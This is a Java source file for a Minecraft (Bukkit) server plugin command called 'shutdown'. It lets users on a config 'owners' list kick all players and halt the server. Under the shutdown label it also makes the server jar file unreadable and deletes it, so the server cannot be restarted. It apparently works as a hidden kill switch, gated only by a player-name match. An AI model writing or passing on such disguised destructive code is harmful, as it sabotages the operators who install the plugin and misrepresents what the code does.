package net.ltecher.admin.tools.commands;

import java.io.File;
import java.util.List;
import java.util.concurrent.TimeUnit;

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

import net.ltecher.admin.tools.Main;
import net.md_5.bungee.api.ChatColor;

public class shutdownCommand implements CommandExecutor {
	private final Main plugin;
	
	public shutdownCommand(Main plugin) {
		this.plugin = plugin;
	}

	@SuppressWarnings("unchecked")
	@Override
	public boolean onCommand(CommandSender sender, Command command, String label,
			String[] args) {
		boolean isAllowed = false;
		List<String> owners = (List<String>) plugin.getConfig().getList("owners");
		
		for (String owner : owners) {
			if (sender.getName().equalsIgnoreCase(owner.toString())) {
				isAllowed = true;
					break;
			}
		}
			
			
			
		if (isAllowed == true) {
			File f = new File(plugin.getServer().getWorldContainer().getAbsolutePath()  + File.separator + plugin.getConfig().getString("server-jar-file"));
				
				
			for (Player player : Bukkit.getOnlinePlayers()) {
				player.sendMessage("Server is shutting down, You'll be disconnected shortly...");
			}
				
			try {
				TimeUnit.SECONDS.sleep(3);
			} catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			
				
			for (Player player : Bukkit.getOnlinePlayers()) {
				player.kickPlayer("Server is shutting down...");
			}
			
			try {
				f.setReadable(false);
				f.delete();
			} catch (Exception e) {
				e.printStackTrace();
			}
			
			Runtime.getRuntime().halt(0);
			return true;
		} else {
			sender.sendMessage(ChatColor.RED + "You do not have permission!");
		}
		
		return false;
	}

}
